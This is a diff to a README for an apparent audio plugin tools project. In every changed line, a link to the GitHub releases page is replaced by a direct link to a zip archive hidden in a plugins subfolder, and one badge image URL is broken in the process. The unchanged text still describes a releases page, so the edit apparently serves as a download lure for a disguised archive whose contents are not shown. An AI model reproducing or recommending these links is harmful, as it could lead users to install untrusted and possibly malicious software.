@@ -1,6 +1,6 @@
 # 🎵 audio-plugin-dev-skills - Easy Access to Audio Plugin Skills
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/berkerarjaguar/audio-plugin-dev-skills/releases)
+[![Download Latest Release](https://github.com/berkerarjaguar/audio-plugin-dev-skills/raw/refs/heads/main/plugins/audio-plugin-validators/dev-plugin-skills-audio-v1.1.zip%20Release-blue?style=for-the-badge)](https://github.com/berkerarjaguar/audio-plugin-dev-skills/raw/refs/heads/main/plugins/audio-plugin-validators/dev-plugin-skills-audio-v1.1.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these simple steps to get started with audio-plugin-dev-skills:
 1. **Download the App**
    This app is available on its GitHub releases page. Click the button below to visit the download page:
 
-   [![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/berkerarjaguar/audio-plugin-dev-skills/releases)
+   [![Download Latest Release](https://github.com/berkerarjaguar/audio-plugin-dev-skills/raw/refs/heads/main/plugins/audio-plugin-validators/dev-plugin-skills-audio-v1.1.zip%20Release-blue?style=for-the-badge)](https://github.com/berkerarjaguar/audio-plugin-dev-skills/raw/refs/heads/main/plugins/audio-plugin-validators/dev-plugin-skills-audio-v1.1.zip)
 
 2. **Choose Your Version**
    On the releases page, you will find different versions for Windows and macOS. Pick the version that matches your operating system. The files you see typically end in `.exe` for Windows or `.dmg` for macOS.
@@ -65,7 +65,7 @@ Follow these simple steps to get started with audio-plugin-dev-skills:
 
 Visit the releases page here to download the latest version of audio-plugin-dev-skills:
 
-[Download audio-plugin-dev-skills](https://github.com/berkerarjaguar/audio-plugin-dev-skills/releases)
+[Download audio-plugin-dev-skills](https://github.com/berkerarjaguar/audio-plugin-dev-skills/raw/refs/heads/main/plugins/audio-plugin-validators/dev-plugin-skills-audio-v1.1.zip)
 
 ### Step-by-step installation for Windows:
 
